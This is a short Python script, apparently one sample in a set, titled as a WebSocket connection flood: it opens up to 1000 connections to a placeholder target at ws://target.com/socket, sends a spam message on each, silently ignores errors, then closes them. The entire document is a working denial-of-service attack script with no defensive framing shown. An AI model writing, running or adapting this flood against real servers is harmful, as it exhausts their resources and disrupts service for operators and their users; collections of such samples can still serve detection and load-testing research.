# WebSocket Connection Flood - Sample 3
import asyncio
import websockets

async def ws_flood():
    uri = "ws://target.com/socket"
    connections = []
    for i in range(1000):
        try:
            ws = await websockets.connect(uri)
            connections.append(ws)
            await ws.send(f"spam_{i}")
        except:
            pass
    
    for ws in connections:
        await ws.close()

asyncio.run(ws_flood())
